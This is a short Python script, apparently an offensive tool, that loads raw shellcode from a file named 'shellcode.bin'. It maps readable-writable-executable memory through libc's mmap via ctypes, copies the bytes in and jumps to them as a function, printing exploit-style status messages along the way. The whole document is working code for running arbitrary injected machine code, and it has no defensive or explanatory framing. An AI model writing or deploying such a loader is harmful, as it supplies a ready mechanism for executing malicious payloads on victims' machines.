import ctypes
import mmap

# Constants
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20
PAGE_SIZE = 0x1000

# Load libc
libc = ctypes.CDLL("libc.so.6")

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

shellcode_size = len(shellcode)
print(f"[*] Loaded {len(shellcode)} bytes of shellcode")

# mmap RWX memory
PAGE_SIZE = 0x1000
ALLOC_SIZE = ((shellcode_size + PAGE_SIZE - 1) // PAGE_SIZE) * PAGE_SIZE

libc.mmap.restype = ctypes.c_void_p
mem = libc.mmap(
    None, ALLOC_SIZE,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
)

if mem == 0 or mem == -1:
    raise RuntimeError("[-] mmap failed")

print(f"[*] Allocated RWX memory at: {hex(mem)}")

# Copy shellcode to RWX memory
ctypes.memmove(mem, shellcode, len(shellcode))
print("[*] Shellcode written to memory")

# Cast memory to function and call
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(mem)
print("[*] Jumping to shellcode!")
fn()

